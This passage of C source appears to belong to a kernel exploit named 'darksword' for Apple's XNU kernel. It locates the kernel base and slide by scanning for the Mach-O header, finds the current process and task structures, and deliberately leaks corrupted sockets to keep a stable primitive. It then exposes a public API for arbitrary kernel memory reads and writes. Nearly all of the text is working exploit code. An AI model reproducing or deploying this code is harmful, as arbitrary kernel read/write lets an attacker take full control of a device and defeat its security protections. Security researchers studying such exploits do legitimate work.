        pe_log("searching for kernel Mach-O header skipped: using protosw-derived kbase 0x%llx", kernel_base);
    } else {
        kernel_base = zv_name & 0xFFFFFFFFFFFFC000ULL;
        pe_log("searching for kernel Mach-O header from 0x%llx...", kernel_base);
    }
    bool found_header = false;
    if (have_protosw_kernel_base) {
        found_header = true;
    } else {
        for (int scan_i = 0; scan_i < 0x4000 && kernel_base >= 0xfffffff000000000ULL; scan_i++) {
            uint64_t magic = early_kread64(kernel_base);
            if (magic == 0x100000cfeedfacfULL) {
                uint64_t cpuinfo = early_kread64(kernel_base + 8);
                if (cpuinfo == 0xc00000002ULL || cpuinfo == 0xB00000000ULL) {
                    found_header = true;
                    break;
                }
            }
            kernel_base -= PAGE_SZ;
        }
    }
    if (!found_header) {
        pe_log("PANIC GUARD: kernel Mach-O header not found after 0x4000 pages");
        return panic_guard_abort_cleanup();
    }
    uint64_t unslid_base_used = 0;
    kernel_slide = compute_kernel_slide(kernel_base, &unslid_base_used);
    pe_log("kernel_base:  0x%llx", kernel_base);
    pe_log("unslid_base: 0x%llx", unslid_base_used);
    pe_log("kernel_slide: 0x%llx", kernel_slide);
    pe_log("kernel r/w is ready!");

    pe_log("about to call ourproc()");
    our_proc = ourproc();
    pe_log("returned from ourproc(): 0x%llx", our_proc);
    if (!our_proc) {
        pe_log("PANIC GUARD: ourproc() failed (0x0) - aborting run before post-exploit phases");
        panic_guard_abort_cleanup();
        g_ds_ready = false;
        return -1;
    }

    pe_log("about to call ourtask()");
    our_task = ourtask(our_proc);
    pe_log("returned from ourtask(): 0x%llx", our_task);
    if (!our_task) {
        pe_log("PANIC GUARD: ourtask() failed (0x0) - aborting run before post-exploit phases");
        panic_guard_abort_cleanup();
        g_ds_ready = false;
        return -1;
    }

    /* Bug #314: defer leak-hardening until the session has already proven that
     * both ourproc() and ourtask() are valid. If we harden the sockets earlier
     * and ourproc() later fails, terminate-time teardown still inherits the
     * corrupted inpcb path and can panic on manual app close. The pre-hardened
     * abort path is safer because it can still use rollback/quarantine logic. */
    pe_log("calling krw_sockets_leak_forever() after ourproc/ourtask validation...");
    krw_sockets_leak_forever();
    pe_log("returned from krw_sockets_leak_forever()");

    g_ds_ready = true;

    pe_log("our_proc: 0x%llx", our_proc);
    pe_log("our_task: 0x%llx", our_task);
    return 0;
}

/* ================================================================
   Public API
   ================================================================ */

int ds_run(void) {
    g_ds_ready = false;
    g_free_thread_should_exit = false;
    g_free_thread_created = false;
    g_panic_guard_abort_latched = false;
    reset_transient_state();

    /* Reset state from any previous attempt to prevent double-corruption.
     * If a prior run corrupted a socket PCB but failed later,
     * that socket must not be reused — closing it might trigger
     * kernel panic from stale icmp6filt pointer. We intentionally
     * leave old corrupted sockets open (they're leaked by design). */
    if (control_socket > 0 || rw_socket > 0) {
        pe_log("WARNING: previous attempt left sockets open (control=%d rw=%d) — leaking them",
               control_socket, rw_socket);
    }
    control_socket = 0;
    rw_socket = 0;
    control_socket_pcb = 0;
    rw_socket_pcb = 0;
    kernel_base = 0;
    kernel_slide = 0;
    our_proc = 0;
    our_task = 0;
    g_zone_map_min = 0;
    g_zone_map_max = 0;

    random_marker     = ((uint64_t)arc4random() << 32) | arc4random();
    wired_page_marker = ((uint64_t)arc4random() << 32) | arc4random();
    target_file_size  = PAGE_SZ * 2;

    default_file_content = calloc(1, target_file_size);
    if (!default_file_content) {
        pe_log("ds_run: default_file_content allocation failed");
        return -1;
    }
    for (uint64_t i = 0; i < target_file_size; i += 8)
        *(uint64_t *)(default_file_content + i) = random_marker;

    pe_log("starting darksword");
    int result = pe();

    if (result < 0 && g_panic_guard_abort_latched) {
        pe_log("ds_run: panic-guard abort latched, returning -2 to stop outer retries");
        result = -2;
    }

    free(default_file_content);
    default_file_content = NULL;
    return result;
}

bool ds_is_ready(void)          { return g_ds_ready; }
uint64_t ds_get_kernel_base(void)  { return kernel_base; }
uint64_t ds_get_kernel_slide(void) { return kernel_slide; }

uint64_t ds_kread64(uint64_t address) { return early_kread64(address); }
bool ds_kread64_checked(uint64_t address, uint64_t *value) {
    if (!value) return false;
    *value = 0;
    return early_kread_checked(address, value, sizeof(*value));
}

uint32_t ds_kread32(uint64_t address) {
    uint32_t value = 0;
    early_kread(address, &value, 4);
    return value;
}

bool ds_kread32_checked(uint64_t address, uint32_t *value) {
    if (!value) return false;
    *value = 0;
    return early_kread_checked(address, value, sizeof(*value));
}

void ds_kwrite64(uint64_t address, uint64_t value) { early_kwrite64(address, value); }
void ds_kwrite32(uint64_t address, uint32_t value) {
    uint8_t buf[EARLY_KRW_LENGTH];
    early_kread(address, buf, EARLY_KRW_LENGTH);
    *(uint32_t *)buf = value;
    early_kwrite32bytes(address, buf);
}

void ds_kread(uint64_t address, void *buffer, uint64_t size) {
    kread_length(address, buffer, size);
}

bool ds_kread_checked(uint64_t address, void *buffer, uint64_t size) {
    return kread_length_checked(address, buffer, size);
}

void ds_enter_proc_read_scope(void) {
    if (g_proc_read_scope_depth == 0) {
        g_proc_scope_block_count = 0;
        g_proc_scope_block_latched = false;
    }
    if (g_proc_read_scope_depth < 0x1000) {
        g_proc_read_scope_depth++;
    }
}

void ds_leave_proc_read_scope(void) {
    if (g_proc_read_scope_depth > 0) {
        g_proc_read_scope_depth--;
        if (g_proc_read_scope_depth == 0) {
            g_proc_scope_block_count = 0;
            g_proc_scope_block_latched = false;
        }
    }
}

bool ds_proc_scope_guard_tripped(void) {
    return g_proc_scope_block_latched;
}

void ds_reset_proc_scope_guard(void) {
    g_proc_scope_block_count = 0;
    g_proc_scope_block_latched = false;
}

void ds_kwrite(uint64_t address, void *buffer, uint64_t size) {
    kwrite_length(address, buffer, size);
}

uint64_t ds_get_pcbinfo(void)      { return early_kread64(control_socket_pcb + 0x38); }
uint64_t ds_get_rw_socket_pcb(void) { return rw_socket_pcb; }
uint64_t ds_get_zone_map_min(void) { return g_zone_map_min; }
uint64_t ds_get_zone_map_max(void) { return g_zone_map_max; }
/* Bug #225: safe lower bound that skips VM+RO submaps (per-CPU allocs) */
uint64_t ds_get_zone_safe_min(void) { return g_zone_safe_min; }
uint64_t ds_get_our_proc(void)     { return our_proc; }
uint64_t ds_get_our_task(void)     { return our_task; }
